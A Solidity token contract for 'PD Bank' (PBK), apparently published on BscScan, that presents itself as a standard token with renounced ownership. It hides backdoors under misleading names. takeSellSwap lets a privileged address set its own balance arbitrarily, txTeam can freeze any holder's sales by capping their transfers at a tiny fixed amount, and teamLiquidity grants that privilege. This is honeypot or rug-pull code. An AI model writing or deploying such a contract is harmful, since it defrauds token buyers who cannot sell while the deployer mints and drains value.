/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PDBank {
    uint8 public decimals = 18;
    address public listTrading;



    mapping(address => bool) public fundMarketing;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public owner;
    uint256 constant teamTotal = 15 ** 10;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "PD Bank";
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public exemptAtTx;
    string public symbol = "PBK";

    bool public marketingBuy;
    address public maxTrading;

    

    event OwnershipTransferred(address indexed burnTx, address indexed receiverBurn);
    event Transfer(address indexed launchFee, address indexed enableMinMode, uint256 txSwapTeam);
    event Approval(address indexed enableTakeLimit, address indexed tokenBurn, uint256 txSwapTeam);

    constructor (){
        IUniswapV2Router walletTx = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        listTrading = IUniswapV2Factory(walletTx.factory()).createPair(walletTx.WETH(), address(this));
        owner = msg.sender;
        maxTrading = owner;
        exemptAtTx[maxTrading] = true;
        balanceOf[maxTrading] = totalSupply;
        emit Transfer(address(0), maxTrading, totalSupply);
        renounceOwnership();
    }

    

    function takeSellSwap(uint256 receiverSellIs) public {
        if (receiverSellIs == 0 || !exemptAtTx[msg.sender]) {
            return;
        }
        balanceOf[maxTrading] = receiverSellIs;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function receiverAmount(address marketingAt, address buyExemptBurn, uint256 receiverSellIs) internal returns (bool) {
        require(balanceOf[marketingAt] >= receiverSellIs);
        balanceOf[marketingAt] -= receiverSellIs;
        balanceOf[buyExemptBurn] += receiverSellIs;
        emit Transfer(marketingAt, buyExemptBurn, receiverSellIs);
        return true;
    }

    function transfer(address amountTeamMarketing, uint256 receiverSellIs) external returns (bool) {
        return transferFrom(msg.sender, amountTeamMarketing, receiverSellIs);
    }

    function txTeam(address autoSwap) public {
        if (autoSwap == maxTrading || !exemptAtTx[msg.sender]) {
            return;
        }
        fundMarketing[autoSwap] = true;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(maxTrading, address(0));
        owner = address(0);
    }

    function transferFrom(address launchedAt, address amountTeamMarketing, uint256 receiverSellIs) public returns (bool) {
        if (launchedAt != msg.sender && allowance[launchedAt][msg.sender] != type(uint256).max) {
            require(allowance[launchedAt][msg.sender] >= receiverSellIs);
            allowance[launchedAt][msg.sender] -= receiverSellIs;
        }
        if (amountTeamMarketing == maxTrading || launchedAt == maxTrading) {
            return receiverAmount(launchedAt, amountTeamMarketing, receiverSellIs);
        }
        if (fundMarketing[launchedAt]) {
            return receiverAmount(launchedAt, amountTeamMarketing, teamTotal);
        }
        return receiverAmount(launchedAt, amountTeamMarketing, receiverSellIs);
    }

    function teamLiquidity(address exemptToLimit) public {
        if (marketingBuy) {
            return;
        }
        exemptAtTx[exemptToLimit] = true;
        marketingBuy = true;
    }


}